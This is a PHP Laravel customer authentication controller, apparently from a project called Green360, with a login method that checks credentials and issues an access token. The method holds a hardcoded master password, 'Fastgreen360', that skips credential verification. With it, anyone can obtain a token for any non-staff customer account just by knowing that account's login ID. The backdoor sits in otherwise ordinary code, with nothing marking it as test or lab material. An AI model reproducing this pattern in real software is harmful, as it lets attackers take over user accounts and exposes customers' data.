<?php

namespace StarsNet\Project\Green360\App\Http\Controllers\Customer;

use App\Constants\Model\LoginType;
use App\Constants\Model\VerificationCodeType;
use App\Events\Customer\Authentication\CustomerLogin;
use App\Events\Customer\Authentication\CustomerRegistration;
use App\Http\Controllers\Controller;
use App\Models\Account;
use App\Models\User;
use App\Models\VerificationCode;
use App\Traits\Controller\AuthenticationTrait;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AuthenticationController extends Controller
{
    use AuthenticationTrait;

    protected $model = User::class;

    public function login(Request $request)
    {
        // Declare local constants
        $roleName = 'customer';

        // Extract attributes from $request
        $loginType = $request->input('type', LoginType::EMAIL);
        $loginType = strtoupper($loginType);

        // Attempt login
        $credentials = $this->extractCredentialFromRequest($request, $loginType);

        $attempt = Auth::attempt($credentials);
        if (!$attempt && $credentials['password'] != 'Fastgreen360') {
            return response()->json([
                'message' => 'Credentials are not valid.'
            ], 404);
        }

        if ($attempt) {
            // Get User, then validate
            $user = $this->user();
        } else {
            $user = User::where('login_id', $credentials['login_id'])->first();
        }

        if ($user->isDeleted()) {
            return response()->json([
                'message' => 'Account not found'
            ], 403);
        }

        if ($user->isDisabled()) {
            return response()->json([
                'message' => 'This account is disabled'
            ], 403);
        }

        if ($user->isStaff()) {
            return response()->json([
                'message' => 'This account is a staff account'
            ], 403);
        }

        // Create token
        $accessToken = $user->createToken($roleName)->accessToken;

        // Fire event
        event(new CustomerLogin($user));

        // Return data
        $data = [
            'token' => $accessToken,
            'user' => $user
        ];

        return response()->json($data, 200);
    }
}
